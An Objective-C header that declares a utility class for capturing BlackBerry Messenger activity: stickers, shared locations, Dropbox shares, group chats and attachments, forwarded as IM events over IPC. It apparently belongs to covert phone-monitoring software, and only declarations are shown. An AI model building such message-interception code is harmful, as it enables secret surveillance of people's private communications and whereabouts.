//
//  BBMUtils.h
//  MSFSP
//
//  Created by Ophat Phuetkasickonphasutha on 11/21/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "FxEventEnums.h"

@class FxIMEvent, FxVoIPEvent, Attachment, SharedFile2IPCSender, BBMCoreAccess;
@class FxIMGeoTag, BBMLocation, DBChooserResult, BBMCoreAccessGroup;
@class BBMMessage;

@interface BBMUtils : NSObject {
@private
    SharedFile2IPCSender	*mIMSharedFileSender;
    SharedFile2IPCSender	*mIMSharedFileSender1;
    SharedFile2IPCSender	*mIMSharedFileSender2;
    long long mBBMUtilsTimestamp;
    
    NSMutableArray          *mCapturedBMMMessageIdentifers;
}

@property (retain) SharedFile2IPCSender *mIMSharedFileSender;
@property (retain) SharedFile2IPCSender *mIMSharedFileSender1;
@property (retain) SharedFile2IPCSender *mIMSharedFileSender2;
@property (assign) long long mBBMUtilsTimestamp;

+ (id) sharedBBMUtils;

+ (void) sendBBMEvent: (FxIMEvent *) aIMEvent;

+ (void) captureOutgoingStickerWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                                   withStickerID: (NSString *) aStickerID
                             withConversationIDs: (NSArray *) aConversationIDs;
+ (void) captureIncomingStickerWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                                   withStickerID: (NSString *) aStickerID
                             withConversationIDs: (NSArray *) aConversationIDs
                                         IMEvent: (FxIMEvent *) aIMEvent;

+ (void) captureOutgoingGlympseWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                                  withGlympseMsg: (NSString *) aGlympseMsg
                             withConversationIDs: (NSArray *) aConversationIDs;

+ (void) captureOutgoingDropboxWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                             withConversationIDs: (NSArray *)aConversationIDs
                                 dbChooserResult: (DBChooserResult *) aChooserResult
                                         caption: (NSString *) aCaption;

+ (void) captureOutgoingSharedLocationWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                                            withJSONMsg: (NSString *) aJSONMsg;
+ (FxIMGeoTag *) locationFromBBMLocation: (BBMLocation *) aBBMLocation;

+ (void) captureOutgoingGroupChatWithBBMCoreAccessGroup: (BBMCoreAccessGroup *) aBBMCoreAccessGroup
                                                message: (NSString *) aMessage
                                               groupUri: (NSString *) aGroupUri;

+ (void) captureGroupChatWithBBMCoreAccessGroup: (BBMCoreAccessGroup *) aBBMCoreAccessGroup
                                    messageType: (NSString *) aMessageType
                                    messageInfo: (NSDictionary *) aMessageInfo
                                       groupUri: (NSString *) aGroupUri;

+ (void) captureIncomingAttachementWithBBMMessage: (BBMMessage *) aBBMMessage
                                          IMEvent: (FxIMEvent *) aIMEvent;

- (void) saveCapturedBBMMessageIdentifier: (NSString *) aIdentifier;
- (BOOL) isBBMMessageIdentifierCaptured: (NSString *) aIdentifier;
@end
